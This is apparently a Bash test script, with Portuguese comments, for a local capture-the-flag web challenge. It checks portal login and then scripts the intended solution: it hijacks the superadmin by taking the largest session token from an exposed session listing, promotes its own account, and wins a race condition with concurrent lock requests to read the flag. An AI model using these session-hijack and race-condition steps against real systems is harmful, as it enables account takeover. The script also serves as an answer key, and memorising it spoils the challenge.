#!/usr/bin/env bash
# Testes do Desafio 03 · Fire (rodar com o Compose da raiz no ar)
#   FIRE_BASE=http://fire.localhost:8080 bash tests/test.sh
set -u
B="${FIRE_BASE:-http://fire.localhost:8080}"
P="${PORTAL_BASE:-http://localhost:8080}/api/api.php"
pass=0; fail=0
ok(){ echo "  [OK] $1"; pass=$((pass+1)); }
no(){ echo "  [FALHOU] $1"; fail=$((fail+1)); }
jget(){ python3 -c "import sys,json;d=json.load(sys.stdin);print(d$1)" 2>/dev/null; }

# Obtém pelo portal o cookie assinado que libera este subdomínio. Depois
# disso, toda chamada curl inclui o cookie sem alterar a mecânica `sessions`.
AUTH_JAR=$(mktemp)
trap 'rm -f "$AUTH_JAR"' EXIT
PORTAL_USER="fire_test_$RANDOM"
PORTAL_MAIL="$PORTAL_USER@example.test"
CSRF=$(command curl -s -c "$AUTH_JAR" "$P?action=bootstrap" | jget "['csrf']")
command curl -s -b "$AUTH_JAR" -c "$AUTH_JAR" -H 'Content-Type: application/json' -H "X-CSRF-Token: $CSRF" \
  -d "{\"username\":\"$PORTAL_USER\",\"email\":\"$PORTAL_MAIL\",\"password\":\"selo1234\"}" \
  "$P?action=register" >/dev/null
command curl -s -b "$AUTH_JAR" -c "$AUTH_JAR" -H 'Content-Type: application/json' -H "X-CSRF-Token: $CSRF" \
  -d "{\"email\":\"$PORTAL_MAIL\",\"password\":\"selo1234\"}" "$P?action=login" >/dev/null
command curl -s -L -b "$AUTH_JAR" -c "$AUTH_JAR" "$P?action=launch&challenge=fire" >/dev/null
grep -q 'oracle_challenge' "$AUTH_JAR" || { echo 'Falha ao obter ingresso do portal.' >&2; exit 1; }
ORACLE_CHALLENGE=$(awk '$6 == "oracle_challenge" { value=$7 } END { print value }' "$AUTH_JAR")
curl(){
  local cookie="oracle_challenge=$ORACLE_CHALLENGE" args=()
  while [ "$#" -gt 0 ]; do
    if [ "$1" = '-b' ] || [ "$1" = '--cookie' ]; then
      shift; cookie="$cookie; $1"
    else
      args+=("$1")
    fi
    shift
  done
  command curl -b "$cookie" "${args[@]}"
}

# cadastra (idempotente) + login real -> devolve o token da conta (player)
login(){
  curl -s "$B/register.php" --data-urlencode "password=selo1234" >/dev/null
  curl -s "$B/login.php" --data-urlencode "password=selo1234" | jget "['token']"
}
# a MAIOR sessão do diretório = a do Guardião Supremo (superadmin)
biggest(){ curl -s -b "sessions=$1" "$B/sessions" | python3 -c "
import sys,json;d=json.load(sys.stdin);print(max(d['files'],key=lambda f:f['size'])['name'])"; }
role(){ curl -s -b "sessions=$1" "$B/whoami.php" | jget "['role']"; }

echo '=== ACESSO PELO PORTAL E ROTA LIMPA ==='
[ "$(command curl -s -o /dev/null -w '%{http_code}' "$B/oracle-fire")" = "302" ] && ok "sem ingresso redireciona ao login" || no "rota aceitou visitante"
[ "$(curl -s -o /dev/null -w '%{http_code}' "$B/oracle-fire")" = "200" ] && ok "ingresso do portal libera /oracle-fire" || no "ingresso não liberou rota limpa"
[ "$(curl -s -o /dev/null -w '%{http_code}' "$B/oracle_fire.html")" = "403" ] && ok "arquivo .html direto é bloqueado" || no "arquivo .html ficou público"

echo '=== CONTAS REAIS (cadastro/login) ==='
[ "$(curl -s "$B/register.php" --data-urlencode "username=nome_ignorado" --data-urlencode "password=selo1234" | jget "['user']")" = "$PORTAL_USER" ] && ok "cadastro usa o username do portal" || no "cadastro aceitou outro username"
[ -n "$(curl -s "$B/register.php" --data-urlencode "password=selo1234" | jget "['error']")" ] && ok "cadastro duplicado rejeitado" || no "aceitou duplicado"
[ -n "$(curl -s "$B/login.php" --data-urlencode "password=errada" | jget "['error']")" ] && ok "senha errada rejeitada" || no "senha errada passou"
[ "$(curl -s "$B/login.php" --data-urlencode "username=outro_nome" --data-urlencode "password=selo1234" | jget "['user']")" = "$PORTAL_USER" ] && ok "login permanece vinculado ao portal" || no "login trocou a identidade"
[ "$(curl -s "$B/reforge.php" --data-urlencode "password=novo5678" | jget "['user']")" = "$PORTAL_USER" ] && ok "reforja troca apenas o selo da conta vinculada" || no "reforja falhou"
[ -n "$(curl -s "$B/login.php" --data-urlencode "password=selo1234" | jget "['error']")" ] && ok "selo antigo deixa de funcionar" || no "selo antigo continuou válido"
[ "$(curl -s "$B/login.php" --data-urlencode "password=novo5678" | jget "['ok']")" = "True" ] && ok "novo selo autentica" || no "novo selo não autenticou"
curl -s "$B/reforge.php" --data-urlencode "password=selo1234" >/dev/null

echo '=== ETAPA 1: achar superadmin + promover a própria conta ==='
PA=$(login)
[ "$(role "$PA")" = "player" ] && ok "conta comum inicia como player (não autorizada)" || no "papel inicial errado"
[ -n "$(curl -s -b "sessions=$PA" "$B/vault.php" | jget "['error']")" ] && ok "player é barrado no cofre (401)" || no "player acessou o cofre"
DIRECTORY=$(curl -s -b "sessions=$PA" "$B/sessions")
[ "$(printf '%s' "$DIRECTORY" | python3 -c "import sys,json; print(len(json.load(sys.stdin)['files']))")" = "200" ] && ok "diretório lista exatamente 200 sessões" || no "quantidade de sessões incorreta"
[ "$(printf '%s' "$DIRECTORY" | python3 -c "import sys,json; s=sorted(f['size'] for f in json.load(sys.stdin)['files']); print(60 <= s[0] and s[-2] <= 100)")" = "True" ] && ok "199 sessões comuns ficam entre 60 e 100 bytes" || no "faixa das sessões comuns incorreta"
[ "$(printf '%s' "$DIRECTORY" | python3 -c "import sys,json; f=json.load(sys.stdin)['files']; i=max(range(len(f)),key=lambda i:f[i]['size']); print(i == 99 and len(f[i+1:]) == 100 and all(60 <= e['size'] <= 100 for e in f[i+1:]))")" = "True" ] && ok "100 sessões falsas ficam depois da sessão correta" || no "ordem das sessões adicionais incorreta"
[ "$(printf '%s' "$DIRECTORY" | python3 -c "import sys,json; f=json.load(sys.stdin)['files']; print(len({e['name'] for e in f}) == len(f) and all(e['size'] == len(e['name']) for e in f))")" = "True" ] && ok "tokens únicos e sizes correspondem aos tamanhos reais" || no "tokens duplicados ou size incorreto"
[ "$(printf '%s' "$DIRECTORY" | python3 -c "import sys,json; s=sorted(f['size'] for f in json.load(sys.stdin)['files']); print(200 <= s[-1] <= 250 and s[-1] > s[-2])")" = "True" ] && ok "sessão correta é única e fica entre 200 e 250 bytes" || no "disparidade da sessão correta incorreta"
SUP=$(biggest "$PA")
[ "${#SUP}" -gt "${#PA}" ] && ok "sessão do Guardião Supremo é MAIOR (pista de tamanho)" || no "superadmin não é maior"
[ "$(role "$SUP")" = "superadmin" ] && ok "usar o token maior -> vira Guardião Supremo" || no "hijack não deu superadmin"
# player NÃO consegue promover (só o superadmin)
[ -n "$(curl -s -b "sessions=$PA" "$B/promote.php" --data-urlencode "username=outro_nome" | jget "['error']")" ] && ok "player não consegue promover (401)" || no "player promoveu!"
# superadmin promove a conta da instância
[ "$(curl -s -b "sessions=$SUP" "$B/promote.php" --data-urlencode "username=outro_nome" | jget "['user']")" = "$PORTAL_USER" ] && ok "Guardião autoriza somente a identidade do portal" || no "promoção trocou a identidade"
# agora o MESMO token de player resolve como admin (papel vem do banco)
[ "$(role "$PA")" = "admin" ] && ok "após autorizar, a conta vira admin (mesmo token)" || no "conta não virou admin"

echo '=== ETAPA 2: race condition ==='
# 4 SEQUENCIAIS não abrem.
for n in 1 2 3 4; do curl -s -b "sessions=$PA" "$B/lock.php?n=$n" -X POST >/dev/null; done
[ "$(curl -s -b "sessions=$PA" "$B/vault.php" | jget "['solved']")" != "True" ] && ok "4 SEQUENCIAIS NÃO abriram (esperado)" || no "sequenciais abriram"
# 4 CONCORRENTES abrem (com a conta já autorizada)
for n in 1 2 3 4; do curl -s -b "sessions=$PA" "$B/lock.php?n=$n" -X POST >/dev/null & done; wait
flagA=$(curl -s -b "sessions=$PA" "$B/vault.php" | jget "['flag']")
[ "$(curl -s -b "sessions=$PA" "$B/vault.php" | jget "['solved']")" = "True" ] && ok "4 PARALELAS abriram o cofre (flag=$flagA)" || no "paralelas não abriram"

echo; echo "RESULTADO: $pass OK, $fail falha(s)"
exit $([ "$fail" -eq 0 ] && echo 0 || echo 1)
